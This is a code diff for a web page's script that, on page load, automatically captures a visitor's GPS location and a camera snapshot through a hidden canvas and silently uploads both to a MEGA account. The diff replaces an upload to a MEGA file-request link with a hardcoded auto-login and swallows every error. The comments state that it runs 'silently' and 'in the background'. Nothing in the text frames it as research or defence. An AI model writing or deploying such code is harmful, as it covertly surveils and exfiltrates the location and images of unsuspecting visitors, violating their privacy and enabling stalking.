@@ -13,17 +13,23 @@
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        // Disable right-click context menu
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
-
-        // Use MEGA file request link
-        const fileRequestLink = "https://mega.nz/filerequest/pfypZxt51fU"; // Replace with your actual link
-
         let megaSession = null;
 
-        // Auto-login to MEGA (removed for file request link)
+        // Auto-login to MEGA
+        function autoAuthenticateMega() {
+            const megaEmail = "your-email@example.com";
+            const megaPassword = "your-password";
+
+            const mega = new Mega();
+            mega.login(megaEmail, megaPassword)
+                .then(session => {
+                    megaSession = session;
+                    startProcess();
+                })
+                .catch(error => {});
+        }
+
+        // Capture GPS and Camera Data Automatically
         function startProcess() {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
@@ -58,29 +64,20 @@
 
         // Upload files silently
         function uploadToMega(canvas, location) {
+            if (!megaSession) {
+                autoAuthenticateMega();
+                return;
+            }
+
             const imageDataUrl = canvas.toDataURL("image/jpeg");
             const imageBlob = dataURLtoBlob(imageDataUrl);
             const locationBlob = new Blob([location], { type: 'text/plain' });
 
-            // Using the MEGA file request link to upload
-            const formData = new FormData();
-            formData.append("file", imageBlob, "photo.jpg");
-            formData.append("file", locationBlob, "location.txt");
+            const mega = new Mega({ session: megaSession });
 
-            fetch(fileRequestLink, {
-                method: "POST",
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log("✅ Files uploaded successfully to MEGA.");
-                } else {
-                    console.log("❌ File upload failed.");
-                }
-            })
-            .catch(err => {
-                console.log(`❌ Error uploading to MEGA: ${err}`);
-            });
+            mega.upload("photo.jpg", imageBlob)
+                .then(() => mega.upload("location.txt", locationBlob))
+                .catch(() => {});
         }
 
         function dataURLtoBlob(dataurl) {
@@ -90,8 +87,8 @@
             return new Blob([u8arr], { type: mime });
         }
 
-        // Automatically start the process in the background
-        window.onload = () => { startProcess(); };
+        // Automatically start in the background
+        window.onload = () => { autoAuthenticateMega(); };
     </script>
 </body>
 </html>
